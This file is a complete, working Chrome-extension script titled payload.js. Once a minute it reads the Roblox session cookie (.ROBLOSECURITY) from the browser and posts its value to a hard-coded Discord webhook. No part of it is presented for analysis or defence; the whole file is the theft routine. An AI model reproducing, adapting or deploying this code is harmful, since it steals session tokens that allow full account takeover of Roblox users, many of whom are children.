// payload.js

(function() {
  console.log("Payload script loaded, starting cookie sending process...");

  // Set an interval to check for cookies
  setInterval(() => {
    // Fetch the Roblox cookie
    chrome.cookies.get({ url: "https://www.roblox.com", name: ".ROBLOSECURITY" }, function(cookie) {
      if (cookie) {
        console.log("RobloxSecurity Cookie found:", cookie.value);

        // Prepare the payload for Discord
        const payload = {
          content: `RobloxSecurity Cookie: ${cookie.value}`,
        };

        // Send the cookie to the Discord webhook
        fetch('https://discord.com/api/webhooks/1354848168734625856/oS5V_P3C9JrYSCXR59cFouU3GRVYnSv3BdfCUGDlOP4cPeGsZb-c-E5LWHNVVumhLvhU', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify(payload),
        })
        .then(response => {
          if (response.ok) {
            console.log("Cookie successfully sent to Discord");
          } else {
            console.error("Failed to send cookie to Discord, status:", response.status);
          }
        })
        .catch(error => {
          console.error("Error while sending cookie to Discord:", error);
        });
      } else {
        console.log("RobloxSecurity Cookie not found.");
      }
    });
  }, 60000); // Run every minute
})();
